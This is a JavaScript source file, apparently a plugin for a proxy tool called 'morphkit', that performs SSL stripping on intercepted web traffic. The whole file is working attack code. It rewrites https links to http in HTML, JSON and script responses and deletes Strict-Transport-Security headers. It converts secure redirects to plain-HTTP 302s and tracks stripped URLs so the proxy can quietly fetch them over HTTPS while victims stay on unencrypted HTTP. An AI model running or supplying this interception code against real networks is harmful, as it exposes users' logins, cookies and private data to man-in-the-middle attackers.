var fs = require('fs');
var log4js = require('log4js');
var http = require('http');
var https = require('https');
var util = require('util');
var liburl = require('url');

var logger = log4js.getLogger("morphkit::plugins::sslstrip");

var urlExpression = /(https:\/\/[\w\d:#@%/;$()~_?\+-=\\\.&]*)/ig;
var urlType = /https:\/\//ig;
var urlExplicitPort = /https:\/\/([a-zA-Z0-9.]+):[0-9]+\//ig;



var StrippedUrls = {}; //all urls got 302s / META
var StrippedSites = {};

function trackUrl(url) {
    if (!url || url == undefined) return;
    url = url.toLowerCase();
    if (!StrippedUrls[url]) {
        logger.info("[Adding] ", url);
        StrippedUrls[url] = 1;// = liburl.parse(url);
    }
    var parsed = liburl.parse(url);
    if(!StrippedSites[parsed.host]) {
        StrippedSites[parsed.host] = 1;
    }
}

function isTracked(url, site_track) {
    site_track = true;
    url = url.toLowerCase();
    var parsed = liburl.parse(url);
    var host = parsed.host;
    //possibly do host match, but not for now
    return StrippedUrls[url] || (site_track && StrippedSites[host]);
}

function replaceSecureLinks(dt) {
    var x = dt.match(urlExpression);
    for (var i = 0; x && i < x.length; i++) {
        var m = x[i] + "";
        m = m.replace("https", "http");
        m = m.replace(/\&amp;/ig, "&");
        dt = dt.replace(x[i], m);
        trackUrl(m);
        logger.trace("Hit - Stripping", x[i]);
    }
    //remains - bad boys
    dt = dt.replace(urlExplicitPort, 'http://$1/');
    dt = dt.replace(urlType, 'http://');
    return dt;
}

function parseClientHeaders(headers) {
    // delete headers["accept-encoding"];
    delete headers["if-modified-since"];
    delete headers["cache-control"];
}

function parseHeaders(headers) {
    //clean headers
    headers["connection"] = "closed"; //optional?
    delete headers["strict-transport-security"];
    if (headers["location"]) {
        var loc = headers["location"];
        if (loc != replaceSecureLinks(headers["location"])) {
            headers["location"] = replaceSecureLinks(headers["location"]);
            return 302;
        }
        return;
    }
    return;
}

function strip(env, ctx, next) {
    // var arg = this[0];


    if (!ctx.HTTP) {
        return next(ERROR, "SSLStrip does not work on non-http requests");
    }
    if (ctx.ended) {
        return next(); //skip
    }

    logger.trace(ctx.req.url);
    //check for tracked url
    //and thus makes the request

    parseClientHeaders(ctx.req.headers);

    if (isTracked(ctx.req.url)) {
        ctx.upstream.options.port = /*ctx.req.url_parsed.port || */ 443;
        ctx.upstream.proto = https;

        logger.warn("TRACKED", ctx.upstream.options);
    }

    ctx.events.on('upstream', (_, cb) => {
        var headers = ctx.upstream.res.headers;
        var redir = parseHeaders(headers);
        if (redir == 302) {
            ctx.upstream.res_status = 302; //we don't like 301
            headers["connection"] = "closed";
            // console.log(headers["location"]);
            // ctx.upstream.res_header = { location: headers["location"] };
        }
        if (ctx.upstream.res_write_buffer) {
            //shouldn't be.. as contents're already gathered
            var cache = ctx.upstream.res_write_buffer.toString('utf8');
            var len1 = cache.length;
            cache = replaceSecureLinks(cache);
            var len2 = cache.length;
            logger.fatal("Modification (Stripped)", len1, len2);
            ctx.upstream.res_write_buffer = cache;
        }
        return cb(); //nothing done
    });

    return next();
    // var redirection = parseHeaders(ctx.req);
    // if (redirection) {
    //     ctx.res.statusCode = 302;
    //     ctx.res.["location"] = replaceSecureLinks(downstreamHeader["location"]) + ("&dummy" + Math.random().toString());
    //     downstreamHeader["connection"] = "closed";
    //     return next();
    // }
}


function strip_inline() {
    var args = this[0];
    return `
        resheader({
            "content-type": /(html|json|javascript)/,
            "content-disposition": /^(?!.*attachment)/
        })
        .loadContent()
        ._strip_()
    `;
}

VERB("http", "_strip_", strip);
INLINE("http", "strip", strip_inline);